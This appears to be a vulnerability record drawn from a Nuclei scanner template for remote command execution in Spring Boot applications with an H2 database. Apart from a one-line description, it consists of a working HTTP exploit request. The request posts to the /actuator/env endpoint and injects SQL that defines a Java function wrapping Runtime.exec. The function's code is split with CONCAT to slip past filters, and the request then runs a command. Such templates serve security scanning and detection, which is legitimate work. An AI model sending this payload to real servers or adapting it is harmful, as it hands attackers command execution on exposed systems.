# Vulnerability: Spring Boot H2 Database - Remote Command Execution
**Classification:** CWE-78,CWE-94
**Source:** Nuclei Template (`springboot-h2-db-rce.yaml`)

## Description
Spring Boot H2 Database is susceptible to remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /actuator/env HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "name":"spring.datasource.hikari.connection-test-query",
  "value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('whoami');"
}
```

